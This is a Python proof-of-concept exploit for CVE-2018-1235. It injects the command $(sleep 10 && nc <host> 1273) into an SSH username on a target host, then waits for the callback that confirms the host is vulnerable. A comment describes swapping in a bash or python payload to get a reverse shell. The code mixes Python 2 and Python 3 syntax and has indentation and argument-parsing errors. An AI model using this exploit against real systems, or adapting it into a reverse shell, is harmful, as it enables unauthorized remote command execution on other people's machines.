#!/usr/bin/env python
# Please note that this will not work on Windows due to the way that the PExpect Library handles the 'spawn' directive. See issue #321 on the PExpect GitHub for more information.
# Also, you're responsible for your use or alteration of this code to do things other than simply test for CVE-2018-1235.

import pexpect
import os
import socket
import sys
import getopt

def main(argv):

	try:
		opts, args = getopt.getopt(argv, "ht:r:", ["target=","reversehost="])
	except getopt.GetoptError:
		print('\nCould not interpret argument. What are you doing?')
		sys.exit(2)

	for opt, arg in opts:
		if opt == '-h':
			print('\n-t <Target IP> -h <Display this Message>')
			sys.exit()
		elif opt in ('-t', '--target'):
			target = arg
		elif opt in  ('-r' '--reversehost'):
			reversehost = arg

	#Create responses, strings, and spawn shell using pexpect library for SSH to vulnerable host.

	try:
		print("[+] Spawning SSH Session...\n")
		singleQuote = "'"
		# This variable can be edited to pop a reverse shell - just use a bash or python one as the payload as opposed to the 'nc' command.
		# Obviously, this code will NOT handle the shell for you, you will need a separate listener.
		exploit = singleQuote + "$(sleep 10 && nc " + reversehost + " 1273)" + singleQuote
		shell = pexpect.spawn("ssh " + exploit + "@" + target, timeout=1)
	except:
		pass

        print("[+] Command injection sent!\n")
	
	#Create socket to listen for connection from vulnerable host. We'll confirm cmd injection with a simple TCP handshake.
	
	print("[+] Setting up socket...\n")

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", 1273))

	print "[+] Waiting on connection - if you do not receive one in thirty seconds, you won't. Quit with CTRL-C.\n"

	s.listen(3)
	conn, addr = s.accept()
	print("[+] Received connection from " + str(addr) + "! Host is vulnerable!")
	s.close()
	

if __name__ == "__main__":
	main(sys.argv[1:])
